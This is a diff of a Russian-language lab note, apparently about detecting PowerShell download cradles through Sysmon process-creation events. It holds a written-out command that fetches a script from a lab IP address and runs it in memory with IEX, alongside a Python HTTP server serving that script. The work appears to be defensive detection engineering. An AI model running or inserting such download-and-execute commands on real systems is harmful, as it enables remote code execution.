@@ -5,7 +5,7 @@
     hostname
     Get-Date
 
-Далее сделаем файл доступным по http (простой и быстрый способ)
+Далее сделаем файл доступным по http:
 
     python3 -m http.server 80
 
@@ -20,7 +20,7 @@
 
     powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://172.16.10.10/test.ps1')"
 
-![rdp_unsuccess](../screenshots/image-8.png)
+![powershelldownloadcmd](../screenshots/image-13.png)
 
 # 2. Источник логов (Data Source)
 Sysmon (EventID 1 — Process Create)
